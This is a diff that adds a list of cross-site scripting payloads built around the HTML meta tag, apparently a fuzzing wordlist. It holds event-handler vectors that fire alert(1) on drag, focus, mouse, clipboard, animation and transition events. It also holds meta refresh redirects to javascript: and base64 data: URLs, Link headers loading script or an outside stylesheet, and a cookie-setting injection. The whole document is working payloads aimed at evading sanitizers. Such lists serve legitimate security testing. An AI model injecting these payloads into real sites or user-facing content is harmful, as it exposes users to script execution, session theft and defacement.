@@ -1,0 +1,43 @@
+<meta draggable="true" ondrag="alert(1)">test</meta>
+<meta draggable="true" ondragend="alert(1)">test</meta>
+<meta draggable="true" ondragenter="alert(1)">test</meta>
+<meta draggable="true" ondragleave="alert(1)">test</meta>
+<meta draggable="true" ondragstart="alert(1)">test</meta>
+<meta id=x tabindex=1 onactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
+<meta id=x tabindex=1 onfocus=alert(1)></meta>
+<meta id=x tabindex=1 onfocusin=alert(1)></meta>
+<meta onbeforecopy="alert(1)" contenteditable>test</meta>
+<meta onbeforecut="alert(1)" contenteditable>test</meta>
+<meta onbeforepaste="alert(1)" contenteditable>test</meta>
+<meta onclick="alert(1)">test</meta>
+<meta oncontextmenu="alert(1)">test</meta>
+<meta oncopy="alert(1)" contenteditable>test</meta>
+<meta oncut="alert(1)" contenteditable>test</meta>
+<meta ondblclick="alert(1)">test</meta>
+<meta onkeydown="alert(1)" contenteditable>test</meta>
+<meta onkeypress="alert(1)" contenteditable>test</meta>
+<meta onkeyup="alert(1)" contenteditable>test</meta>
+<meta onmousedown="alert(1)">test</meta>
+<meta onmouseenter="alert(1)">test</meta>
+<meta onmouseleave="alert(1)">test</meta>
+<meta onmousemove="alert(1)">test</meta>
+<meta onmouseout="alert(1)">test</meta>
+<meta onmouseover="alert(1)">test</meta>
+<meta onmouseup="alert(1)">test</meta>
+<meta onpaste="alert(1)" contenteditable>test</meta>
+<style>:target {color: red;}</style><meta id=x style="transition:color 10s" ontransitioncancel=alert(1)></meta>
+<style>:target {color:red;}</style><meta id=x style="transition:color 1s" ontransitionend=alert(1)></meta>
+<style>:target {transform: rotate(180deg);}</style><meta id=x style="transition:transform 2s" ontransitionrun=alert(1)></meta>
+<style>@keyframes slidein {}</style><meta style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></meta>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style="position:absolute;" onanimationcancel="alert(1)"></meta>
+<style>@keyframes x{}</style><meta style="animation-name:x" onanimationend="alert(1)"></meta>
+<style>@keyframes x{}</style><meta style="animation-name:x" onanimationstart="alert(1)"></meta>
+<svg><meta onload=alert(1)></meta>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
